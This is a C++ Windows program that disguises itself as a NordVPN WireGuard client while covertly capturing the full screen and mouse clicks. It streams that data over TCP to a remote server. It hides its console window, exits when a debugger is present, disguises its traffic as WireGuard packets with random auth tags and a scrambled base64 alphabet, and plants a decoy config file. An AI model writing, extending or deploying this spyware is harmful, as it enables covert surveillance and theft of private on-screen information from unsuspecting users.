#include <iostream>
#include <string>
#include <thread>
#include <chrono>
#include <random>
#include <sstream>
#include <vector>
#include <algorithm>
#include <fstream>
#include <memory>
#include <cstdint>
#include <climits>
#include <mutex>
#include <iomanip>

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <mmsystem.h>

#define PROCESS_NAME "nordvpn.exe"
#define WINDOW_TITLE "NordVPN"

// Allow larger screen capture packets (up to 50MB) to prevent premature disconnects
static constexpr uint32_t MAX_PACKET_SIZE = 50 * 1024 * 1024;

class WireGuardEncoder {
private:
    static const std::string chars;
    
public:
    static std::string encode(const std::vector<BYTE>& input) {
        std::string result;
        int val = 0, valb = -6;
        for (BYTE c : input) {
            val = (val << 8) + c;
            valb += 8;
            while (valb >= 0) {
                result.push_back(chars[(val >> valb) & 0x3F]);
                valb -= 6;
            }
        }
        if (valb > -6) result.push_back(chars[((val << 8) >> (valb + 8)) & 0x3F]);
        while (result.size() % 4) result.push_back('=');
        return result;
    }

    static std::vector<BYTE> decode(const std::string& input) {
        std::vector<int> T(256, -1);
        for (int i = 0; i < 64; i++) T[chars[i]] = i;
        
        std::vector<BYTE> result;
        int val = 0, valb = -8;
        for (unsigned char c : input) {
            if (T[c] == -1) break;
            val = (val << 6) + T[c];
            valb += 6;
            if (valb >= 0) {
                result.push_back((val >> valb) & 0xFF);
                valb -= 8;
            }
        }
        return result;
    }
};

const std::string WireGuardEncoder::chars = "QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890+/";

static std::string g_ip_default;
static std::string g_ip_result;

LRESULT CALLBACK InputWndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    static HWND hEdit;
    switch (msg) {
    case WM_CREATE:
        hEdit = CreateWindowA("EDIT", g_ip_default.c_str(),
                              WS_CHILD | WS_VISIBLE | WS_BORDER | ES_AUTOHSCROLL,
                              10, 10, 200, 20, hwnd, (HMENU)1, nullptr, nullptr);
        CreateWindowA("BUTTON", "OK",
                      WS_CHILD | WS_VISIBLE | BS_DEFPUSHBUTTON,
                      220, 10, 60, 20, hwnd, (HMENU)IDOK, nullptr, nullptr);
        return 0;
    case WM_COMMAND:
        if (LOWORD(wParam) == IDOK) {
            char buffer[256];
            GetWindowTextA(hEdit, buffer, sizeof(buffer));
            g_ip_result = buffer;
            DestroyWindow(hwnd);
            return 0;
        }
        break;
    case WM_CLOSE:
        DestroyWindow(hwnd);
        return 0;
    case WM_DESTROY:
        PostQuitMessage(0);
        return 0;
    }
    return DefWindowProc(hwnd, msg, wParam, lParam);
}

static std::string PromptServerIP(const std::string& def) {
    g_ip_default = def;
    g_ip_result.clear();

    WNDCLASSA wc{};
    wc.lpfnWndProc = InputWndProc;
    wc.hInstance = GetModuleHandleA(nullptr);
    wc.lpszClassName = "IPInputClass";
    RegisterClassA(&wc);

    HWND hwnd = CreateWindowA("IPInputClass", "Server IP",
                              WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU,
                              CW_USEDEFAULT, CW_USEDEFAULT, 300, 80,
                              nullptr, nullptr, wc.hInstance, nullptr);
    ShowWindow(hwnd, SW_SHOW);

    MSG msg;
    while (GetMessage(&msg, nullptr, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnregisterClassA("IPInputClass", wc.hInstance);
    if (g_ip_result.empty()) g_ip_result = def;
    return g_ip_result;
}

class ChaChaCompressor {
public:
    static std::vector<BYTE> compressRLE(const std::vector<BYTE>& data) {
        std::vector<BYTE> compressed;
        if (data.empty()) return compressed;
        
        for (size_t i = 0; i < data.size(); ) {
            BYTE current = data[i];
            BYTE count = 1;
            
            while (i + count < data.size() && data[i + count] == current && count < 255) {
                count++;
            }
            
            // Also encode literal 0xFF values to avoid sentinel conflicts
            if (count >= 3 || current == 0 || current == 0xFF) {
                compressed.push_back(0xFF);
                compressed.push_back(count);
                compressed.push_back(current);
            } else {
                for (BYTE j = 0; j < count; j++) {
                    compressed.push_back(current);
                }
            }
            i += count;
        }
        return compressed;
    }
};

struct WireGuardHeader {
    BYTE type;
    BYTE reserved[3];
    DWORD sender_index;
    ULONGLONG counter;
    BYTE nonce[12];
    
    WireGuardHeader() {
        type = 0x04;
        memset(reserved, 0, 3);
        sender_index = GetTickCount();
        counter = GetTickCount64();
        for (int i = 0; i < 12; i++) {
            nonce[i] = rand() % 256;
        }
    }
};

struct WireGuardPacket {
    WireGuardHeader header;
    std::vector<BYTE> encrypted_payload;
    BYTE auth_tag[16];
    
    WireGuardPacket(const std::vector<BYTE>& payload) {
        encrypted_payload = payload;
        for (int i = 0; i < 16; i++) {
            auth_tag[i] = rand() % 256;
        }
    }
    
    std::vector<BYTE> serialize() const {
        std::vector<BYTE> packet;
        packet.resize(sizeof(WireGuardHeader));
        memcpy(packet.data(), &header, sizeof(WireGuardHeader));
        
        packet.insert(packet.end(), encrypted_payload.begin(), encrypted_payload.end());
        packet.insert(packet.end(), auth_tag, auth_tag + 16);
        
        return packet;
    }
    
    static WireGuardPacket deserialize(const std::vector<BYTE>& data) {
        WireGuardPacket packet({});
        if (data.size() >= sizeof(WireGuardHeader) + 16) {
            memcpy(&packet.header, data.data(), sizeof(WireGuardHeader));
            
            size_t payload_size = data.size() - sizeof(WireGuardHeader) - 16;
            packet.encrypted_payload.assign(
                data.begin() + sizeof(WireGuardHeader),
                data.begin() + sizeof(WireGuardHeader) + payload_size
            );
            
            memcpy(packet.auth_tag, data.data() + data.size() - 16, 16);
        }
        return packet;
    }
};

class TunnelProtocol {
public:
    static std::string generateKey32() {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(0, 255);
        
        std::string key;
        for (int i = 0; i < 32; i++) {
            char hex[3];
            sprintf_s(hex, "%02x", dis(gen));
            key += hex;
        }
        return key;
    }
    
    static std::vector<BYTE> createTunnelPayload(const std::string& type, const std::string& data) {
        std::stringstream payload;
        payload << type << ":" << data;
        
        std::string payload_str = payload.str();
        std::vector<BYTE> result(payload_str.begin(), payload_str.end());
        
        while (result.size() % 16 != 0) {
            result.push_back(0x00);
        }
        
        return result;
    }
    
    static std::pair<std::string, std::string> extractTunnelPayload(const std::vector<BYTE>& payload) {
        std::string data(payload.begin(), payload.end());
        size_t colon_pos = data.find(':');
        if (colon_pos != std::string::npos) {
            std::string type = data.substr(0, colon_pos);
            std::string value = data.substr(colon_pos + 1);
            value.erase(std::find_if(value.rbegin(), value.rend(), [](unsigned char ch) {
                return ch != '\0';
            }).base(), value.end());
            return {type, value};
        }
        return {"", ""};
    }
};

class WireGuardCapture {
private:
    int screen_width;
    int screen_height;
    
public:
    WireGuardCapture() : screen_width(0), screen_height(0) {}

    bool initialize() {
        // Ensure the process is DPI aware so high-resolution screens (>1080p)
        // report their true pixel dimensions rather than scaled values.
        // This fixes cases where GetSystemMetrics would cap values at 1920x1080
        // on high-DPI displays.
        SetProcessDPIAware();
        screen_width = GetSystemMetrics(SM_CXSCREEN);
        screen_height = GetSystemMetrics(SM_CYSCREEN);
        return (screen_width > 0 && screen_height > 0);
    }
    
    std::vector<BYTE> captureFrame() {
        HDC hdcScreen = GetDC(nullptr);
        HDC hdcMem = CreateCompatibleDC(hdcScreen);
        
        HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, screen_width, screen_height);
        HBITMAP hOldBitmap = (HBITMAP)SelectObject(hdcMem, hBitmap);
        
        BitBlt(hdcMem, 0, 0, screen_width, screen_height, hdcScreen, 0, 0, SRCCOPY);

        // Draw mouse cursor onto captured frame
        CURSORINFO ci;
        ci.cbSize = sizeof(CURSORINFO);
        if (GetCursorInfo(&ci) && ci.flags == CURSOR_SHOWING) {
            ICONINFO ii;
            if (GetIconInfo(ci.hCursor, &ii)) {
                int cx = ci.ptScreenPos.x - (int)ii.xHotspot;
                int cy = ci.ptScreenPos.y - (int)ii.yHotspot;
                DrawIconEx(hdcMem, cx, cy, ci.hCursor, 0, 0, 0, nullptr, DI_NORMAL);
                if (ii.hbmMask) DeleteObject(ii.hbmMask);
                if (ii.hbmColor) DeleteObject(ii.hbmColor);
            }
        }

        BITMAPINFO bmi = {0};
        bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
        bmi.bmiHeader.biWidth = screen_width;
        bmi.bmiHeader.biHeight = -screen_height;
        bmi.bmiHeader.biPlanes = 1;
        bmi.bmiHeader.biBitCount = 24;
        bmi.bmiHeader.biCompression = BI_RGB;

        int stride = ((screen_width * 3 + 3) & ~3);
        int imageSize = stride * screen_height;
        std::vector<BYTE> rawData(imageSize);

        GetDIBits(hdcMem, hBitmap, 0, screen_height, rawData.data(), &bmi, DIB_RGB_COLORS);
            
        std::vector<BYTE> frameData(static_cast<size_t>(screen_width) * screen_height * 3);
        for (int y = 0; y < screen_height; ++y) {
            memcpy(frameData.data() + static_cast<size_t>(y) * screen_width * 3,
                   rawData.data() + static_cast<size_t>(y) * stride,
                   screen_width * 3);
        }
        
        SelectObject(hdcMem, hOldBitmap);
        DeleteObject(hBitmap);
        DeleteDC(hdcMem);
        ReleaseDC(nullptr, hdcScreen);
        
        return frameData;
    }
    
    int getWidth() const { return screen_width; }
    int getHeight() const { return screen_height; }
};

class TunnelStealth {
public:
    static void hideFromProcessList() {
        SetConsoleTitleA(WINDOW_TITLE);
        
        HWND consoleWindow = GetConsoleWindow();
        if (consoleWindow) {
            ShowWindow(consoleWindow, SW_HIDE);
        }
    }
    
    static void setProcessName(const char* name) {
        SetConsoleTitleA(name);
    }
    
    static bool isDebuggerPresent() {
        return IsDebuggerPresent() || CheckRemoteDebuggerPresent(GetCurrentProcess(), nullptr);
    }
    
    static void createWireGuardConfig(const std::string& host, int port) {
        std::string appData = getenv("APPDATA");
        std::string nordDir = appData + "\\NordVPN";

        CreateDirectoryA(nordDir.c_str(), nullptr);

        std::ofstream config(nordDir + "\\nordlynx.conf");
        if (config.is_open()) {
            config << "[Interface]\n";
            config << "PrivateKey = " << TunnelProtocol::generateKey32() << "\n";
            config << "Address = 10.5.0.2/32\n";
            config << "DNS = 103.86.96.100\n";
            config << "\n[Peer]\n";
            config << "PublicKey = " << TunnelProtocol::generateKey32() << "\n";
            config << "AllowedIPs = 0.0.0.0/0\n";
            config << "Endpoint = " << host << ":" << port << "\n";
            config.close();
        }
    }
};

class WireGuardClient {
private:
    std::string server_host;
    int server_port;
    std::string session_id;
    std::random_device rd;
    std::mt19937 gen;
    SOCKET tcp_socket;
    
    WireGuardCapture screen_capture;
    std::vector<BYTE> last_frame_data;
    
    static bool sendAll(SOCKET s, const char* data, size_t len) {
        size_t sent = 0;
        while (sent < len) {
            int ret = send(s, data + sent, static_cast<int>(std::min<size_t>(len - sent, INT_MAX)), 0);
            if (ret <= 0) {
                return false;
            }
            sent += static_cast<size_t>(ret);
        }
        return true;
    }

    static bool recvAll(SOCKET s, char* data, size_t len) {
        size_t received = 0;
        while (received < len) {
            int ret = recv(s, data + received, static_cast<int>(std::min<size_t>(len - received, INT_MAX)), 0);
            if (ret <= 0) {
                return false;
            }
            received += static_cast<size_t>(ret);
        }
        return true;
    }

    bool sendWireGuardPacket(const WireGuardPacket& packet) {
        if (tcp_socket == INVALID_SOCKET) return false;

        std::vector<BYTE> packet_data = packet.serialize();
        uint32_t len = static_cast<uint32_t>(packet_data.size());
        char len_buf[4] = {
            static_cast<char>((len >> 24) & 0xFF),
            static_cast<char>((len >> 16) & 0xFF),
            static_cast<char>((len >> 8) & 0xFF),
            static_cast<char>(len & 0xFF)
        };
        if (!sendAll(tcp_socket, len_buf, sizeof(len_buf))) {
            return false;
        }
        if (!sendAll(tcp_socket, reinterpret_cast<const char*>(packet_data.data()), packet_data.size())) {
            return false;
        }
        return true;
    }

    WireGuardPacket receiveWireGuardPacket() {
        char len_buf[4];
        if (!recvAll(tcp_socket, len_buf, sizeof(len_buf))) {
            return WireGuardPacket({});
        }
        uint32_t len =
            (static_cast<uint8_t>(len_buf[0]) << 24) |
            (static_cast<uint8_t>(len_buf[1]) << 16) |
            (static_cast<uint8_t>(len_buf[2]) << 8)  |
            (static_cast<uint8_t>(len_buf[3]));
        if (len == 0 || len > MAX_PACKET_SIZE) {
            return WireGuardPacket({});
        }
        std::vector<BYTE> data(len);
        if (!recvAll(tcp_socket, reinterpret_cast<char*>(data.data()), len)) {
            return WireGuardPacket({});
        }
        return WireGuardPacket::deserialize(data);
    }
    
public:
    WireGuardClient(const std::string& host, int port)
        : server_host(host), server_port(port), gen(rd()), tcp_socket(INVALID_SOCKET) {}

    bool initializeConnection() {
        addrinfo hints{};
        hints.ai_family = AF_UNSPEC;
        hints.ai_socktype = SOCK_STREAM;
        hints.ai_protocol = IPPROTO_TCP;
        addrinfo* result = nullptr;
        std::string port_str = std::to_string(server_port);
      
        int ret = getaddrinfo(server_host.c_str(), port_str.c_str(), &hints, &result);
        if (ret == 0) {
            for (addrinfo* rp = result; rp != nullptr; rp = rp->ai_next) {
                tcp_socket = socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol);
                if (tcp_socket == INVALID_SOCKET) continue;

                if (connect(tcp_socket, rp->ai_addr, static_cast<int>(rp->ai_addrlen)) != SOCKET_ERROR) {
                    break;
                }

                closesocket(tcp_socket);
                tcp_socket = INVALID_SOCKET;
            }
            freeaddrinfo(result);
        } else {
        }

        if (tcp_socket == INVALID_SOCKET) {
            sockaddr_in addr{};
            addr.sin_family = AF_INET;
            addr.sin_port = htons(server_port);
            if (inet_pton(AF_INET, server_host.c_str(), &addr.sin_addr) != 1) {
                return false;
            }
            tcp_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (tcp_socket != INVALID_SOCKET &&
                connect(tcp_socket, reinterpret_cast<sockaddr*>(&addr), sizeof(addr)) == SOCKET_ERROR) {
                closesocket(tcp_socket);
                tcp_socket = INVALID_SOCKET;
            }
        }

        if (tcp_socket == INVALID_SOCKET) {
            int alt_port = (server_port == 1194) ? 443 : 1194;
            addrinfo* result = nullptr;
            if (getaddrinfo(server_host.c_str(), std::to_string(alt_port).c_str(), &hints, &result) == 0) {
                for (addrinfo* rp = result; rp != nullptr; rp = rp->ai_next) {
                    tcp_socket = socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol);
                    if (tcp_socket == INVALID_SOCKET) continue;
                    if (connect(tcp_socket, rp->ai_addr, static_cast<int>(rp->ai_addrlen)) != SOCKET_ERROR) {
                        break;
                    }
                    closesocket(tcp_socket);
                    tcp_socket = INVALID_SOCKET;
                }
                freeaddrinfo(result);
            }
            if (tcp_socket == INVALID_SOCKET) {
                sockaddr_in addr{};
                addr.sin_family = AF_INET;
                addr.sin_port = htons(alt_port);
                if (inet_pton(AF_INET, server_host.c_str(), &addr.sin_addr) == 1) {
                    tcp_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
                    if (tcp_socket != INVALID_SOCKET &&
                        connect(tcp_socket, reinterpret_cast<sockaddr*>(&addr), sizeof(addr)) == SOCKET_ERROR) {
                        closesocket(tcp_socket);
                        tcp_socket = INVALID_SOCKET;
                    }
                }
            }
            if (tcp_socket != INVALID_SOCKET) {
                server_port = alt_port;
            } else {
                return false;
            }
        }

        if (tcp_socket == INVALID_SOCKET) {
            return false;
        }

        DWORD timeout = 5000;
      
        setsockopt(tcp_socket, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));

        std::vector<BYTE> handshake_payload = TunnelProtocol::createTunnelPayload("handshake", "initiation");
        WireGuardPacket handshake(handshake_payload);

        if (!sendWireGuardPacket(handshake)) {
            return false;
        }

        WireGuardPacket response = receiveWireGuardPacket();
        auto [type, data] = TunnelProtocol::extractTunnelPayload(response.encrypted_payload);

        if (type == "session") {
            session_id = data;
            return true;
        }
        return false;
    }
    
    void sendDesktopFrame() {
        std::vector<BYTE> frameData = screen_capture.captureFrame();

        if (frameData.empty()) {
            return;
        }

        int width = screen_capture.getWidth();
        int height = screen_capture.getHeight();
        const int bpp = 3;

        bool sendFull = last_frame_data.size() != frameData.size();
        int x = 0, y = 0, w = width, h = height;

        if (!sendFull) {
            int min_x = width, min_y = height, max_x = -1, max_y = -1;
            for (int yy = 0; yy < height; ++yy) {
                for (int xx = 0; xx < width; ++xx) {
                    size_t idx = (static_cast<size_t>(yy) * width + xx) * bpp;
                    if (frameData[idx] != last_frame_data[idx] ||
                        frameData[idx + 1] != last_frame_data[idx + 1] ||
                        frameData[idx + 2] != last_frame_data[idx + 2]) {
                        if (xx < min_x) min_x = xx;
                        if (yy < min_y) min_y = yy;
                        if (xx > max_x) max_x = xx;
                        if (yy > max_y) max_y = yy;
                    }
                }
            }

            if (max_x >= min_x && max_y >= min_y) {
                x = min_x;
                y = min_y;
                w = max_x - min_x + 1;
                h = max_y - min_y + 1;
            } else {
                return; // No changes
            }
        }

        std::vector<BYTE> region;
        region.reserve(static_cast<size_t>(w) * h * bpp);
        for (int row = 0; row < h; ++row) {
            size_t src = (static_cast<size_t>(y + row) * width + x) * bpp;
            region.insert(region.end(),
                          frameData.begin() + src,
                          frameData.begin() + src + static_cast<size_t>(w) * bpp);
        }

        std::vector<BYTE> compressed = ChaChaCompressor::compressRLE(region);
        std::string encoded = WireGuardEncoder::encode(compressed);

        std::stringstream payload;
        payload << session_id << "|";
        payload << width << "x" << height << "|";
        payload << x << "," << y << "," << w << "," << h << "|";
        payload << encoded;

        std::vector<BYTE> tunnel_payload = TunnelProtocol::createTunnelPayload("screen", payload.str());
        WireGuardPacket packet(tunnel_payload);

        if (sendWireGuardPacket(packet)) {
            last_frame_data = frameData;
        } else {
        }
    }

    void sendMouseEvent(const std::string& evt) {
        if (session_id.empty()) return;
        std::stringstream payload;
        payload << session_id << "|" << evt;
        std::vector<BYTE> tp = TunnelProtocol::createTunnelPayload("event", payload.str());
        WireGuardPacket packet(tp);
        sendWireGuardPacket(packet);
    }

    void detectAndSendMouseEvents() {
        // middle click handling removed

        static bool leftHeld = false;
        static std::chrono::steady_clock::time_point leftDownTime;
        static POINT leftPos{0,0};

        static bool rightHeld = false;
        static std::chrono::steady_clock::time_point rightDownTime;

        auto now = std::chrono::steady_clock::now();

        // LEFT BUTTON: long press -> send long_left:x,y (for trim anchor)
        SHORT leftState = GetAsyncKeyState(VK_LBUTTON);
        bool leftDown = (leftState & 0x8000) != 0;
        if (leftDown && !leftHeld) {
            leftHeld = true;
            leftDownTime = now;
            GetCursorPos(&leftPos);
        }
        if (!leftDown && leftHeld) {
            auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(now - leftDownTime).count();
            if (duration > 800) {
                std::ostringstream ss;
                ss << "long_left:" << leftPos.x << "," << leftPos.y;
                sendMouseEvent(ss.str());
            }
            leftHeld = false;
        }

        // RIGHT BUTTON: short click -> right (screenshot), long press -> long_right (toggle view)
        SHORT rightState = GetAsyncKeyState(VK_RBUTTON);
        bool rightDown = (rightState & 0x8000) != 0;
        if (rightDown && !rightHeld) {
            rightHeld = true;
            rightDownTime = now;
        }
        if (!rightDown && rightHeld) {
            auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(now - rightDownTime).count();
            if (duration > 800) {
                sendMouseEvent("long_right");
            } else {
                sendMouseEvent("right");
            }
            rightHeld = false;
        }

        // no middle-button behavior
    }
    
    void run() {
        TunnelStealth::hideFromProcessList();

        if (TunnelStealth::isDebuggerPresent()) {
            return;
        }

        if (!screen_capture.initialize()) {
            return;
        }
        while (true) {
            try {
                if (initializeConnection()) {
                    TunnelStealth::createWireGuardConfig(server_host, server_port);
                    while (true) {
                        sendDesktopFrame();
                        detectAndSendMouseEvents();
                        
                        // Wait ~16ms but wake immediately on mouse input
                        MSG msg;
                        while (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
                            TranslateMessage(&msg);
                            DispatchMessage(&msg);
                        }
                        MsgWaitForMultipleObjects(0, NULL, FALSE, 16, QS_MOUSE);
                        
                        static int health_check = 0;
                        if (++health_check % 2000 == 0) {
                            std::vector<BYTE> keepalive_payload = TunnelProtocol::createTunnelPayload("keepalive", "ping");
                            WireGuardPacket keepalive(keepalive_payload);
                            if (!sendWireGuardPacket(keepalive)) {
                                break;
                            }
                        }
                    }
                }

                if (tcp_socket != INVALID_SOCKET) {
                    closesocket(tcp_socket);
                    tcp_socket = INVALID_SOCKET;
                }
                std::this_thread::sleep_for(std::chrono::seconds(30));

            } catch (...) {
                std::this_thread::sleep_for(std::chrono::seconds(10));
            }
        }
    }
    
    ~WireGuardClient() {
        if (tcp_socket != INVALID_SOCKET) {
            closesocket(tcp_socket);
        }
    }
};

int main(int argc, char* argv[]) {
    // Hide and detach any console window so the client runs in the background
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    FreeConsole();

    std::string host = "192.168.88.100";
    int port = 1194;
    bool hostProvided = false;

    for (int i = 1; i < argc; ++i) {
        std::string arg = argv[i];
        if (arg == "--https") {
            port = 443;
        } else if (!hostProvided) {
            host = arg;
            hostProvided = true;
        } else {
            port = std::stoi(arg);
        }
    }

    // Always prompt the user for the server IP, using any provided value as default
    host = PromptServerIP(host);

    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return 1;
    }

    WireGuardClient client(host, port);
    client.run();

    WSACleanup();
    return 0;
}
